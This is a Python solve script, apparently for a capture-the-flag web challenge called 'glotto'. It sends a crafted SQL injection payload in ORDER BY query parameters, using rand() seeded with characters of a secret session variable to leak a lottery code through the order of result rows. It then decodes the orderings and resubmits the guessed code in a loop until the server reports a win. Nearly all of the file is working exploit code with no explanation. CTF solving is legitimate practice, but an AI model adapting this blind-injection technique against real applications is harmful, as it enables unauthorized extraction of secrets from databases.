import requests, re

from data.march4 import march_r
from data.april4 import april_r
from data.may3   import may_r
from data.june1  import june_r

marchtable = {'CA5G8VIB6UC9':0, '01VJNN9RHJAC':1, '1WSNL48OLSAJ':2, 'UN683EI26G56':3, 'YYKCXJKAK3KV':4, '00HE2T21U15H':5,'D5VBHEDB9YGF':6, 'I6I8UV5Q64L0':7}
apriltable = {'4KYEC00RC5BZ':0, '7AET1KPGKUG4':1, 'UDT5LEWRSWM9':2, 'OQQRH90KDJH1':3, '2JTBMJW9HZOO':4, 'L4CY1JMRBEAW':5, '8DKYRPIO4QUW':6, 'BFWQCWYK9VHJ':7, '31OSKU57KV49':8}
maytable = {'O3QZ2P6JNSSA':0, 'PQ8ZW6TI1JH7':1, 'OWGVFW0XPLHE':2, 'OMZRJWA7WWBC':3, 'KRRNDWFFIB08':4, 'ZJR7ANXVBLEF':5, '8GAB09Z4Q88A':6}
junetable = {'1JJL716ATSCZ':0, 'YELDF36F4TW7':1, 'WXRJP8D4KKJQ':2, 'G0O9L3XPS3IR':3}

url = 'https://glotto.web.ctfcompetition.com/'

payload = '?order0=winner`*0,rand((ord(MID(@lotto,1,1))-47)*85184%20%2b%20(ord(MID(@lotto,2,1))-47)*1936%20%2b%20(ord(MID(@lotto,3,1))-47)*44%20%2b%20(ord(MID(@lotto,4,1))-47))%23&order1=winner`*0,rand((ord(MID(@lotto,5,1))-47)*85184%20%2b%20(ord(MID(@lotto,6,1))-47)*1936%20%2b%20(ord(MID(@lotto,7,1))-47)*44%20%2b%20(ord(MID(@lotto,8,1))-47))%23&order2=winner`*0,rand((ord(MID(@lotto,9,1))-47)*1936%20%2b%20(ord(MID(@lotto,10,1))-47)*44%20%2b%20(ord(MID(@lotto,11,1))-47))%23&order3=winner`*0,rand((ord(MID(@lotto,12,1))-47))%23'

user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240'

while True:

	headers = { 'User-Agent' : user_agent, 'Connection': 'keep-alive'}
	r = requests.get(url+payload, headers=headers)
	match = re.findall(r'<td>([0-9A-Z]{12})</td>', r.text)
	assert len(match)==28

	march = match[0:8]
	april = match[8:17]
	may   = match[17:24]
	june  = match[24:28]

	march_n = ''
	for x in march:
		march_n += str(marchtable[x])

	april_n = ''
	for x in april:
		april_n += str(apriltable[x])

	may_n = ''
	for x in may:
		may_n += str(maytable[x])

	june_n = ''
	for x in june:
		june_n += str(junetable[x])

	code = march_r[march_n] + april_r[april_n]+ may_r[may_n]+ june_r[june_n]
	print(code)


	headers = { 'User-Agent' : user_agent, 'Connection': 'keep-alive','Content-Type':'application/x-www-form-urlencoded' ,'Cookie': 'PHPSESSID='+r.cookies['PHPSESSID']}
	r = requests.post(url, data='code='+code, headers=headers)
	response = r.text
	if 'You won' in response:
		print(r.text)
		exit()
	elif 'The winning ticket' in response:
		print(r.text)
		continue
	else:
		print(r.text)
